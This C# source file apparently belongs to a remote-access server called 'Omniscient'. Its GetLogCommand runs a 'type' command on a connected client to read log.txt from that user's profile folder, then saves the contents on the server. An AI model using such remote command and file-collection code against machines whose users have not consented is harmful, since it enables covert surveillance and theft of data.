namespace OmniscientServer
{
    public class GetLogCommand : ExecuteOnClientCommand
    {
        public GetLogCommand(Server server) : base(server) { }

        protected override string ExecuteCommand(string[] parameters)
        {
            string[] readLog = { "exec", "type", @$"{server.clientUserProfilePath}\log.txt" };
            string logFileContent = base.ExecuteCommand(readLog);

            Writer(logFileContent, "logs.txt");
            return $"Omniscient$ logs have been imported successfully.";
        }
    }
}